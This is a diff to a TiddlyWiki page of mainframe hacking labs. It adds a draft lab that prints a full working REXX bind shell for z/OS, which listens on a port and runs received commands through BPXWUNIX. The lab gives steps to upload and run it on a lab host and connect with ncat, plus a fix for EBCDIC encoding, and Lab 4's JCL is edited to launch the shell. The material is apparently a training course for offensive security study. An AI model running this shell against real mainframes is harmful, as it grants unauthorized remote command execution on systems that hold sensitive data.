@@ -177,6 +177,8 @@ Error message and password prompt
 
 <li>BONUS Lab 2 - msfvenom</li>
 
+<li>Draft of 'Lab 2 - REXX Shells'</li>
+
 <li>Lab 1 - Login, Copy/Paste a File and Run It</li>
 
 <li>Lab 10 - z/OS Enumeration</li>
@@ -8957,7 +8959,7 @@ Error message and password prompt
 <div created="20181014015416622" modified="20201112173219743" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Open</pre>
 </div>
-<div list="$:/Import [[Lab 1 - Login, Copy/Paste a File and Run It]] [[Lab 2 - REXX Shells]] [[Lab 3 - Jobs and JCL]] [[Lab 4 - RACF]] [[Lab 5 - Access Storage with REXX]] [[Lab 6 - Accessing CICS]] [[BONUS Lab 1 - TN3270]] [[BONUS Lab 2 - msfvenom]] [[Lab 7 - Enumeration]] [[Lab 8 - FTP Code Execution]] [[Lab 9 - Metasploit &amp; Tomcat]] [[Lab 10 - z/OS Enumeration]] [[Lab 11 - NJE Privesc]]" title="$:/StoryList">
+<div list="[[Lab 1 - Login, Copy/Paste a File and Run It]] [[Draft of 'Lab 2 - REXX Shells']] [[Lab 3 - Jobs and JCL]] [[Lab 4 - RACF]] [[Lab 5 - Access Storage with REXX]] [[Lab 6 - Accessing CICS]] [[BONUS Lab 1 - TN3270]] [[BONUS Lab 2 - msfvenom]] [[Lab 7 - Enumeration]] [[Lab 8 - FTP Code Execution]] [[Lab 9 - Metasploit &amp; Tomcat]] [[Lab 10 - z/OS Enumeration]] [[Lab 11 - NJE Privesc]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -9198,6 +9200,158 @@ Great! Now you should see  `IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ` print
 !!!''Evil Thinking''
 * Why do we need to use `netEBCDICat.py` instead of `ncat` ?
 </pre>
+</div>
+<div created="20190513171651997" draft.of="Lab 2 - REXX Shells" draft.title="Lab 2 - REXX Shells" modified="20210518131951304" tags="" title="Draft of 'Lab 2 - REXX Shells'">
+<pre>!!''Lab Objectives''
+# Uploading a file to a mainframe
+# Setting up REXX sockets
+# Executing REXX script
+# Fixing REXX script
+# Executing again
+
+!!''Connecting''
+Start by connecting to `evilmf.evilmainframe.com` and getting to ISPF (Refer to `Lab 1` for instructions)
+
+If you get stuck refer to ''ISPF Naviation'' for help
+
+!!''Create REXX Script in Linux''
+
+* Copy the REXX script below to a file in Linux
+* ''⚠️ NOTE'' using vim below is just an example, you can use any Linux text editor you like
+** In terminal on Kali type: `vim ~/USHELL`
+*** Then in vim type `i`
+** Select the REXX script below (in the gray box)
+** copy it with `CTRL-C` and paste in to vim `CTLR-SHIFT-V`
+** Save and exit vim `:wq`
+```
+/* REXX */
+parse arg p
+mf_ip = '0.0.0.0'
+say 'Opening shell on' mf_ip||':'||p
+n = &quot;25&quot;x
+r = &quot;$ &quot;
+s = SOCKET('INITIALIZE','DAEMON',2)
+s = SOCKET('SOCKET')
+parse var s socket_rc socketID .
+s = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_REUSEADDR','ON')
+s = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_LINGER','OFF')
+s = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON')
+s = Socket('IOCTL',socketID,'FIONBIO','ON')
+s = Socket('BIND',socketID,'AF_INET' p mf_ip)
+s = Socket('Listen',socketID,2)
+parse var s src .
+clients = ''
+DO FOREVER
+SAY 'READING SOCKET' SOCKETID
+ s = Socket('Select','READ' socketID clients 'WRITE' 'EXCEPTION')
+ parse upper var s 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
+ IF INLIST(socketID,readin) THEN DO
+  s = Socket('Accept',socketID)
+  parse var s src hID .
+  clients = hID
+  s = Socket('Socketsetstatus')
+  parse var s src . status
+  s = Socket('Ioctl',hID,'FIONBIO','ON' )
+  s = SOCKET('SEND',hID, &quot;$ &quot;)
+ END
+  if readin = hID THEN DO
+   in = SOCKET('RECV',hID,10000)
+   parse var in s_rc s_data_len s_data_text
+   cmd = DELSTR(s_data_text, s_data_len)
+   CALL BPXWUNIX cmd,,out.,err.
+   text = ''
+   DO i = 1 to err.0
+    text = text||err.i||n
+   END
+   DO i = 1 TO out.0
+    text = text||out.i||n
+   END
+   text = text||r
+   s = SOCKET('SEND',hID, text)
+  END
+ END
+return 0
+/*-------*/
+INLIST: procedure
+ arg sock, socklist
+ DO i = 1 to words(socklist)
+   if words(socklist) = 0 then return 0
+   if sock = word(socklist,i) then return 1
+ end
+ return 0
+```
+* More shells are available here: https://github.com/mainframed/Shells and in the folder `~/Tools/Shells`
+
+
+!!''Uploading a File''
+Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLIB(USHELL)`
+
+!!!''1 - FTP''
+* Use FTP to connect EVILMF `ftp evilmf.evilmainframe.com` and follow the prompts to logon
+* Change working directory to REXXLIB `cd REXXLIB`
+* Change the upload mode to ascii, type `ascii` and hit enter
+* Upload `USHELL` in your home foler: `put USHELL`
+* to exit type `bye`
+
+!!!''2 - Copy/Paste''
+* Type `=3.4` on the ISPF `Command ===&gt;` line, hit enter to enter file browser
+* In `Dsname Level . . .` type `&lt;userid&gt;.*` and hit enter
+* In command column next to `&lt;userid&gt;.REXXLIB` type `E` and hit enter
+* In command line type `s USHELL`
+* If necessary type `RES` to clear any messages
+* on the first five red asterisks `*****` type `i15`
+* ''In a linux terminal'' view the file `USHELL` with `cat /root/USHELL`
+* highlight ''15 lines'' the output and copy `CTRL + SHIFT + C` on laptop keyboard
+* ''In x3270'' make sure `Options -&gt; Toggles -&gt; Paste with Left Margin` is enabled
+* place cursor on the line under first blue asterisk 
+* paste file contents with `CTRL + V` on laptop keyboard and hit enter
+* In `Scroll ===&gt;` in upper left replace `PAGE` with `CSR` this changes the scrolling using `F8` from page to where ever your cursor is
+* Place your cursor on line 15, in the command column
+* Hit `F8`
+* In the command column type `i15`
+* Paste the script
+* Repeat these steps until the entire script is pasted
+ * In `Command ===&gt;` line type `save` and hit enter
+!!!''3 - File Transfer with x3270 and IND$FILE''
+* Type `=6` in ISPF `Command ===&gt;` line and hit enter
+* Make sure your cursor is on the `===&gt;` line
+* ''In x3270'' select `File --&gt; File Transfer...`
+* In dialogue box popup put:
+** Local File Name: `/home/evilmf/USHELL`
+** Host File Name: `'&lt;userid&gt;.REXXLIB(USHELL)'`
+*** ''⚠️ NOTE'' do not forget the single quotes or it will fail
+** Select the option `Send to Host`
+** Select the option `Transfer ASCII File`
+** Leave the rest as is
+** Click `Transfer File`
+
+!!''Execute Shell''
+* Using the examples in the previous lab execute the rexx script `&lt;userid&gt;.REXXLIB(USHELL)` and pass it the argument of a port in the 20,000 to 39,999 range
+** `EX 'EVIL0.REXXLIB(USHELL)' '39999'`
+** ''⚠️NOTE'' DO NOT ALL USE 39999 OR ELSE YOUR BIND WILL FAIL
+* Connect with ncat `ncat evilmf.evilmainframe.com &lt;port&gt;`
+* Notice that when you connect you get `[@`, if you type `ls` you get garbage
+** Before proceeding to the next section think why?
+* When you're done hit `&lt;ctrl&gt;-c` to exit ncat, the rexx script will error out, this is fine
+
+!!''Fix the Script''
+* Edit the script in ISPF
+** Follow the guide from the previous lab
+* On line 13 add insert the following, like you did in Lab 1
+```
+  s = Socket('Setsockopt',socketID,'SOL_SOCKET','SO_ASCII','ON')
+```
+* Save and execute the script
+** Type `save` on the `Command ===&gt;` line
+** Then type `tso ex '&lt;userid&gt;.REXXLIB(USHELL)' '&lt;port&gt;'` on the `Command ===&gt;` line
+* Connect with ncat again
+* At this point you should have a Unix shell prompt in ncat
+** ''If not'' let us know and we'll help
+* Try navigating Unix with this shell
+** Do you notice anything wrong with it? What?
+* To exit hit `&lt;ctrl&gt;-c`
+!!''BONUS''
+* Feel free to try any of the shells in the folder `~/Tools/Shells`</pre>
 </div>
 <div created="20190513164624050" modified="20201112172026360" tags="" title="Lab 1 - Login, Copy/Paste a File and Run It">
 <pre>!!''Before Starting - Update''
@@ -9646,7 +9800,7 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 
 !''Congrats you submitted your first job and read the output!''</pre>
 </div>
-<div created="20181013224531694" modified="20201117211210800" tags="" title="Lab 4 - RACF">
+<div created="20181013224531694" modified="20210419201951135" tags="" title="Lab 4 - RACF">
 <pre>!!''Lab Objectives''
 # Use RACF program `SEARCH` to find datasets in warn mode and surrogate access
 # Use surrogate access to submit jobs as other users
@@ -9704,10 +9858,10 @@ Use ''ONE'' of the three methods below to create the file `&lt;userid&gt;.REXXLI
 //           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,(5,5,5)),
 //           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
 //SYSUT1      DD *
-&lt;place contents of /root/USHELL from lab 2 here&gt;
+&lt;place contents of /home/evilmf/USHELL from lab 2 here&gt;
 //* End of rexx script
 ```
-* Then change the `IKJEFT01` step, replace it to make it look like this
+* Then add the `IKJEFT01` step below after the REXX script, replace it to make it look like this
 ** ''Note'' Make sure you replace `&lt;port&gt;` with a random port between 20000 and 39999
 ```
 //EXECREXX EXEC PGM=IKJEFT01,
